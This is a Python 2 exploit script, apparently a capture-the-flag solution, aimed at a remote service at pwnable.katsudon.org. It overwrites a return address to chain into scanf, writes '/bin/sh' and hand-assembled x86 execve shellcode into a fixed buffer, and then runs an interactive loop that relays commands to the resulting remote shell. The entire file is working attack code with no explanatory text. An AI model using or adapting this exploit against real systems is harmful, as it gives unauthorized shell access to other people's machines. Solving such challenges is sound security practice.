#!/usr/bin/env python
from struct import *
import sys
import socket

rhp     = ("pwnable.katsudon.org",32100)
sh      = "/bin/sh\x00"

offset_name     = 0x00020060
offset_retn     = 0x0002007c

addr_format     = 0x080485c7
addr_scanf      = 0x08048506
addr_buffer     = 0x0804a100

#==========
nc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
nc.settimeout(5.0)
nc.connect(rhp)

exploit =   "\x00"*(offset_retn-offset_name-4)
exploit +=  pack("<I", addr_buffer)
exploit +=  pack("<I", addr_scanf)
exploit +=  pack("<I", addr_format)
exploit +=  pack("<I", addr_buffer)

nc.sendall(exploit+"\x0a")
nc.recv(1024)

payload =   pack("<I", 0xdeadbeef)
payload +=  pack("<I", addr_buffer+0x10)
payload +=  sh
payload +=  "\x00"*(0x10-len(payload))
payload +=  "\x31\xc0"      #xor    %eax,%eax
payload +=  "\x04\x0f"      #add    0x0f,%al
payload +=  "\x34\x04"      #xor    0x04,%eal
payload +=  "\x89\xe3"      #mov    %esp,%ebx
payload +=  "\x31\xc9"      #xor    %ecx,%ecx
payload +=  "\x31\xd2"      #xor    %edx,%edx
payload +=  "\xcd\x80"      #int    0x80

nc.sendall(payload+"\x0a")
nc.recv(1024)
nc.recv(1024)

#==========

cmd=""
while 1:
    cmd = raw_input("$")
    if len(cmd)>0:
        nc.sendall(cmd + " 2>&1\x0a")

    if cmd!="exit":
        rsp = ""
        try:
            while len(rsp)%1024==0:
                rsp += nc.recv(1024)
        except:
            rsp += "Response Timeout"
        finally:
            print rsp
    else:
        break

nc.close()
#==========
